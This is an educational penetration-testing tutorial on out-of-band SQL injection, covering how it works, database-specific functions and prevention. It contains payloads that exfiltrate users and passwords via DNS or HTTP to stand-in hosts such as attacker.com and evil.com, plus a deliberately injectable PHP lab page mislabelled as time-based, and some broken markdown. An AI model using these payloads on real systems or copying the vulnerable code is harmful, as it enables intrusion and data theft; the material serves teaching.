# 🔓 Out-of-Band SQL Injection (OOB SQLi)

> _OOB SQLi is less common but highly impactful when exploitable, enabling attackers to stealthily leak data when traditional SQLi channels are unavailable or ineffective._

---

## 📡 What is Out-of-Band?

**Out-of-Band (OOB)** refers to communication or data transfer that happens through a **separate, different channel** than the primary one used for normal interactions.

In cybersecurity contexts like SQL Injection, OOB means attackers retrieve data or interact with systems using an **alternative method or pathway** — rather than through the immediate response channel of the application.

---

## 🔍 What is OOB SQL Injection?

Out-of-Band SQL Injection is a sophisticated SQL injection technique where:

- Data is **exfiltrated through a separate communication channel** rather than through the same channel used to submit the injection
- The method exploits the database's ability to **send requests** (such as DNS or HTTP calls) to an attacker-controlled server
- Instead of getting the SQL injection result directly in the application's web response _(the usual **in-band** way)_, attackers use a different channel

> 💡 This external communication channel is called the **Out-of-Band channel**, and it allows attackers to exfiltrate data even when the primary channel is blocked or filtered.

OOB methods can be harder to detect because they use **ancillary network protocols** or request types that may not be inspected as closely as the main traffic.

---

## ⚙️ How OOB SQLi Works

```
[1] Attacker discovers a vulnerable input
         ↓
[2] Injected SQL forces the DB to send data to external server
         ↓
[3] Attacker captures the outbound request
         ↓
[4] Sensitive information obtained ✓
```

1. **Discover** — The attacker finds a vulnerable input where SQL queries execute without proper sanitization.
2. **Inject** — Instead of receiving a direct response, the injected SQL forces the database server to send data to an external server controlled by the attacker.
3. **Capture** — The attacker captures this outbound request to obtain sensitive information.

---

## 🛠️ Common Techniques

|Technique|Description|
|---|---|
|🌐 **DNS Exfiltration**|Forcing the database to make DNS lookups to a domain controlled by the attacker containing encoded data|
|📡 **HTTP Requests**|Using functions to make HTTP requests that carry data to the attacker's server|

---

## 🗄️ Database-Specific Methods

|Database|Technique|Example Function/Procedure|
|---|---|---|
|**Oracle**|Send HTTP requests via network|`UTL_HTTP` package|
|**Microsoft SQL**|Trigger SMB or DNS requests|`xp_dirtree` extended procedure|
|**PostgreSQL**|Use `COPY` to a remote file|`COPY` command|
|**MySQL**|Load remote files to exfiltrate|`LOAD_FILE` combined with DNS|

---

## 💥 Example Payloads

### SQL Server

```sql
EXEC xp_dirtree '\\attacker.com\leakdata\' + (SELECT user);
```

### Oracle

```sql
DECLARE req UTL_HTTP.req;
BEGIN
  req := UTL_HTTP.begin_request('http://attacker.com/' || (SELECT user FROM dual));
  UTL_HTTP.end_request(req);
END;
```

### MySQL (OOB via DNS)

```sql
id=1' AND (SELECT IF((SELECT version()) LIKE '8%',
  LOAD_FILE(CONCAT('\\\\test.',(SELECT user()),'.oob-lab.com\\abc')),
  NULL)) --+
```

```sql
id=1' AND (SELECT IF((SELECT version()) LIKE '8%',
  LOAD_FILE('\\\\oob-lab.com\\abc'),
  NULL)) --+
```

---

## ✅ Advantages of OOB SQLi

- **Effective** when direct responses from the server are blocked or filtered
- **Useful** against blind SQL injection scenarios
- **Often harder to detect** and mitigate compared to in-band SQLi

---

## 🛡️ Prevention

|Prevention Measure|Details|
|---|---|
|🔥 **Restrict outbound network access**|Configure the DB server to block external network connections|
|🚫 **Disable dangerous functions**|Disable or restrict `UTL_HTTP`, `xp_dirtree`, `LOAD_FILE`, etc.|
|🧱 **Web Application Firewall**|Employ WAFs to block abnormal external communications|
|🔒 **Input Sanitization**|Use parameterized queries / prepared statements|

---

## 📄 Vulnerable PHP Example (`oob-sqli.php`)

```php
<?php

// Include database connection file

include("connection.php");

  

?>

  

<!DOCTYPE html>

<html>

<head>

<title>Blind Injection Time based</title>

</head>

<body>

  

<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">

<h1><span class="style4">Blind Injection Time based</span> <br>

<font size="3" color="#666666">

<?php

// Check if 'id' parameter exists in URL

if (isset($_GET['id'])) {

// VULNERABILITY: Direct assignment of user input without sanitization

// Attacker can inject time-based SQL payloads

$id = $_GET['id'];

// VULNERABILITY: User input directly concatenated into SQL query

// No prepared statements or parameterized queries used

// Example attack: ?id=1' AND SLEEP(5)-- -

$query = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";

// Query display commented out (doesn't show SQL to user)

//echo $query . "</br>";

// Execute the vulnerable query

// TIME-BASED BLIND SQL INJECTION EXPLOITATION POINT:

// Unlike boolean-based, query results are NOT checked or displayed

// This makes it perfect for time-based attacks where:

// - Attacker injects SLEEP() or delay functions

// - If condition is TRUE: page responds is delayed

// - If condition is FALSE: page responds immediately

// - By measuring response time, attacker extracts data bit by bit

$result = mysqli_query($connection, $query);

}

?>

</font> </h1>

</br></br></br>

</div>

</br></br>

<?php

// CRITICAL: This message ALWAYS displays regardless of query result

// This is what makes TIME-BASED injection necessary:

// - No boolean logic based on query success/failure

// - Same output whether query returns data or not

// - Same output whether SQL is valid or invalid

// - Only observable difference is RESPONSE TIME

//

// Attacker uses timing differences to infer information:

// - Fast response (0.1s) = condition was FALSE

// - Delayed response (5+ seconds) = condition was TRUE

// - By measuring response times, attacker extracts data bit by bit

echo '<font color= "#0000ff">';

echo "Wel Come to Armour Infosec";

echo "<br>";

?>

  

</font> </h1>

  
  
  
  

</div>

</br></br></br>

  
  

</body>

</html>```

---

> ⚠️ **Disclaimer:** This content is for **educational and authorized penetration testing purposes only**. Unauthorized use of these techniques is illegal.

---

_Part of the Web Application Penetration Test → SQL Injection series_]]


```
## Real-Life Simple Example of OOB SQL Injection

Imagine a website like:

```
https://shop.com/product?id=1
```

The backend PHP runs:

sql

````sql
SELECT * FROM products WHERE id = '$id'
```

---

### 🏪 Normal Behavior (In-Band)

You visit `?id=1` → page shows product info → **you get the answer directly in the browser response**. That's **in-band** — same channel in, same channel out.

---

### 🔓 OOB Attack Scenario

The attacker notices the page is **blind** — SQL errors are hidden, no data is reflected back. So they can't use normal injection.

Instead, they craft:
```
https://shop.com/product?id=1' AND (SELECT LOAD_FILE(CONCAT('\\\\',
(SELECT password FROM users WHERE username='admin'),
'.evil.com\\x'))) --+
```

**What happens behind the scenes:**
```
1. MySQL executes the injected query
2. It tries to load a "file" from a network path:
       \\<admin_password>.evil.com\x
3. To do that, it performs a DNS lookup for:
       <admin_password>.evil.com
4. The attacker is watching DNS traffic on evil.com
5. They see a DNS request come in:
       s3cr3tP@ss.evil.com  ← the password just arrived!
````

The **browser shows nothing unusual** — but the password was already leaked through DNS.

---

### 📬 Real-World Analogy

Think of it like asking someone a secret question in a crowded room. Instead of whispering the answer back to you (in-band), they secretly **mail a letter** to your PO box address (out-of-band). Nobody in the room sees the answer exchange — but you receive it anyway.

---

### 🔑 Key Takeaway

||In-Band SQLi|OOB SQLi|
|---|---|---|
|**Answer comes back via**|Browser/HTTP response|DNS or HTTP to attacker's server|
|**Works when**|Errors/data are visible|Response is blind/filtered|
|**Harder to detect?**|No|**Yes**|

The attack is silent, stealthy, and completely bypasses the normal response channel — that's what makes OOB dangerous.
```